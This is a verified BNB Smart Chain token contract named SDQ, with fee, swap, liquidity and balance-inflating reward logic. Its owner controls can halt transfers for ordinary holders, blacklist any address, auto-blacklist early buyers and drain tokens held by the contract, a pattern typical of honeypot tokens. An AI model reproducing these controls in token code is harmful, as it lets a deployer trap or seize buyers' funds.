/**
 *Submitted for verification at BscScan.com on 2022-10-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

/**
 * @dev Standard math utilities missing in the Solidity language.
 */
library Math {
    /**
     * @dev Returns the largest of two numbers.
     */
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    /**
     * @dev Returns the average of two numbers. The result is rounded towards
     * zero.
     */
    function average(uint256 a, uint256 b) internal pure returns (uint256) {
        // (a + b) / 2 can overflow, so we distribute
        return (a / 2) + (b / 2) + ((a % 2 + b % 2) / 2);
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

 
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

   
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
     function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );
}

library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

interface IUniswapV2Pair {
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function sync() external;
}

contract TokenReceiver{
    constructor (address token) public{
        IERC20(token).approve(msg.sender,10 ** 12 * 10**18);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 internal _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals} with
     * a default value of 18.
     *
     * To select a different value for {decimals}, use {_setupDecimals}.
     *
     * All three of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) public {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * WARNING: This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract SDQ is ERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;

    mapping (address => bool) private _isBlacklisted;

    bool public swapsEnabled;

    uint256 public constant BASE_RATIO = 10**18;
    uint256 public constant SPY = (508 * BASE_RATIO) / 10000 / 1 days;
    uint256 public maxTxAmount = 100 * BASE_RATIO;

    uint256 public _lPFee = 10;
    uint256 public totalFee = 10;

    IUniswapV2Router02 public uniswapV2Router;

    mapping(address => bool) public ammPairs;

    bool public canTransfer;
    uint256 public extraSupply;
    uint256 public rewardEndTime;
    mapping(address => uint256) public lastUpdateTime;
    mapping(address => bool) public rewardBlacklist;

    bool inSwapAndLiquify;
    
    IERC20 public uniswapV2Pair;
    address public awardToken;

    address public tokenReceiver;

    address public lpReceiver;
    address public fun1;
    address public fun2;
    address public fun3;

    uint256 public launchedBlock;
    uint256 public killblock = 2;
    bool public isLaunch = false;

    address public fundAddress;

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    constructor (
        string memory _name,
        string memory _symbol,
        uint8 _decimals,
        address _route,
        address _awardToken,
        address _lpReceiver,
        address _fun1,
        address _fun2,
        address _fun3
        ) public ERC20(_name, _symbol) {
            _owner = msg.sender;
            fundAddress = msg.sender;
          _setupDecimals(_decimals);
        
         awardToken = _awardToken;

         lpReceiver = _lpReceiver;
         fun1 = _fun1;
         fun2 = _fun2;
         fun3 = _fun3;
        
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(0)] = true;


        uniswapV2Router = IUniswapV2Router02(_route);
         
        address swapV2PairAddress = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), awardToken);

        rewardEndTime = block.timestamp.add(30 days);

        setRewardBlacklist(swapV2PairAddress, true);
        setRewardBlacklist(address(this), true);
        setRewardBlacklist(address(0), true);
        setRewardBlacklist(msg.sender, true);
        
        uniswapV2Pair = IERC20(swapV2PairAddress);
        ammPairs[swapV2PairAddress] = true;


        tokenReceiver = address(new TokenReceiver(address(awardToken)));
        
        _mint(msg.sender, 100000 * 10 ** 18);

    }

    modifier onlyFunder() {
      require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
      _;
    }

    function setAmmPair(address pair,bool hasPair)external onlyOwner{
        ammPairs[pair] = hasPair;
    }

    function setTxAmount(uint256 _tx)external onlyFunder{
        maxTxAmount = _tx;
    }

    function setCanTransfer(bool enable) external onlyOwner {
        canTransfer = enable;
    }

    function setSwapsEnabled(bool _enabled) public onlyOwner {
      swapsEnabled = _enabled;
    }

    function setRewardBlacklist(address account, bool enable) public onlyFunder {
        rewardBlacklist[account] = enable;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account].add(getReward(account));
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply.add(extraSupply);
    }

    function getReward(address account) public view returns (uint256) {
        if (lastUpdateTime[account] == 0 || rewardBlacklist[account]) {
            return 0;
        }
        return
            _balances[account].mul(SPY).div(BASE_RATIO).mul(
                lastTime().sub(lastUpdateTime[account])
            );
    }

    function lastTime() public view returns (uint256) {
        return Math.min(block.timestamp, rewardEndTime);
    }

    modifier calculateReward(address account) {
        if (account != address(0)) {
            uint256 reward = getReward(account);
            if (reward > 0) {
                _balances[account] = _balances[account].add(reward);
                extraSupply = extraSupply.add(reward);
            }
            lastUpdateTime[account] = lastTime();
        }
        _;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override calculateReward(from) calculateReward(to) {}

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        require(!_isBlacklisted[recipient] && !_isBlacklisted[_msgSender()], "Blacklisted address");
        require(
            canTransfer || _isExcludedFromFee[recipient] || _isExcludedFromFee[_msgSender()],
            "can not transfer"
        );
        return super.transfer(recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        require(!_isBlacklisted[sender] && !_isBlacklisted[recipient], "Blacklisted address");
        require(
            canTransfer || _isExcludedFromFee[sender] || _isExcludedFromFee[recipient],
            "can not transfer"
        );
        return super.transferFrom(sender, recipient, amount);
    }

    function excludeFromFee(address account) public onlyFunder {
        _isExcludedFromFee[account] = true;
    }
    
    function includeInFee(address account) public onlyFunder {
        _isExcludedFromFee[account] = false;
    }

     function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function isBlackList(address account) public view returns(bool) {
        return _isBlacklisted[account];
    }

    function addBot(address recipient) internal {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }

    function Launch() public onlyOwner {
        isLaunch = true;
        launchedBlock = block.number;
    }

    function setKillBlock(uint num) public onlyOwner {
        killblock = num;
    }

    function writeBlackList(address recipient, bool isBlack) public onlyOwner {
        _isBlacklisted[recipient] = isBlack;
    }

    function _take(uint256 tValue,address from,address to) private {
        super._transfer(from, to, tValue);
    }

    struct Param{
        bool takeFee;
        uint tTransferAmount;
        uint tLP;
        uint tMk;
        uint tBurn;
    }

    function _initParam(uint256 tAmount,Param memory param) private view  {
        param.tLP = tAmount * _lPFee / 100;
        uint tFee = tAmount * totalFee / 100;
        param.tTransferAmount = tAmount.sub(tFee);
    }

    function _takeFee(Param memory param,address from)private {
        if( param.tLP > 0 ){
            _take(param.tLP, from, address(this));
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {

        require(swapsEnabled || _isExcludedFromFee[from] || _isExcludedFromFee[to], "zero");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "Blacklisted address");

        Param memory param;

        param.tTransferAmount = amount;

        uint256 contractTokenBalance = balanceOf(address(this));
        
        if( 
            contractTokenBalance >= maxTxAmount 
            && !inSwapAndLiquify 
            && !ammPairs[from] ){

            inSwapAndLiquify = true;

            swapAndAward(maxTxAmount.mul(6).div(10));

            swapAndLiquify(maxTxAmount.mul(4).div(10));

            inSwapAndLiquify = false;
        }

        bool takeFee = true;

        if( ammPairs[from] && _isExcludedFromFee[to]  ){
            takeFee = false;
        }

        if( ammPairs[to] && _isExcludedFromFee[from] ){
            takeFee = false;
        }

        if( !ammPairs[from] && !ammPairs[to] && (_isExcludedFromFee[from] || _isExcludedFromFee[to]) ){
            takeFee = false;
        }

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(isLaunch, "Swap not open");
            if(from == address(uniswapV2Pair)) {
                if (block.number <= launchedBlock + killblock) {                  
                    addBot(to);
                }
            }
        }

        param.takeFee = takeFee;
        if( takeFee ){
            _initParam(amount,param);
        }
        
        _tokenTransfer(from,to,param);

    }

    function swapAndAward(uint256 tokenAmount) private  {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = awardToken;

        IERC20(path[0]).approve(address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            tokenReceiver,
            block.timestamp
        );

        uint bal = IERC20(awardToken).balanceOf(tokenReceiver);
        if( bal > 0 ){
            IERC20(awardToken).transferFrom(tokenReceiver,address(fun1),bal.mul(34).div(100));
            IERC20(awardToken).transferFrom(tokenReceiver,address(fun2),bal.mul(17).div(100));
            IERC20(awardToken).transferFrom(tokenReceiver,address(fun3),bal.mul(49).div(100));
        }
    }

    function swapAndAwardContract(uint256 tokenAmount) private  {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = awardToken;

        IERC20(path[0]).approve(address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            tokenReceiver,
            block.timestamp
        );

        uint bal = IERC20(awardToken).balanceOf(tokenReceiver);
        if( bal > 0 ){
            IERC20(awardToken).transferFrom(tokenReceiver,address(this),bal);
        }
    }

    function swapAndLiquify(uint256 contractTokenBalance) private {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half, "sub half");
        swapAndAwardContract(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered
        uint256 fistBalance = IERC20(awardToken).balanceOf(address(this));

        // add liquidity to uniswap
        addLiquidityFist(otherHalf, fistBalance);
        
        emit SwapAndLiquify(half, fistBalance, otherHalf);
    }

    function addLiquidityFist(uint256 tokenAmount, uint256 fistAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        IERC20(awardToken).approve(address(uniswapV2Router), fistAmount);

        uniswapV2Router.addLiquidity(
            address(this),
            address(awardToken),
            tokenAmount,
            fistAmount,
            0,
            0,
            lpReceiver,
            block.timestamp
        );
    }


    function _tokenTransfer(address sender, address recipient, Param memory param) private {
        super._transfer(sender, recipient, param.tTransferAmount);
        if(param.takeFee){
            _takeFee(param,sender);
        }
    }

    function donateDust(address addr, uint256 amount) external onlyFunder {
        TransferHelper.safeTransfer(addr, _msgSender(), amount);
    }

    function donateEthDust(uint256 amount) external onlyFunder {
        TransferHelper.safeTransferETH(_msgSender(), amount);
    }
}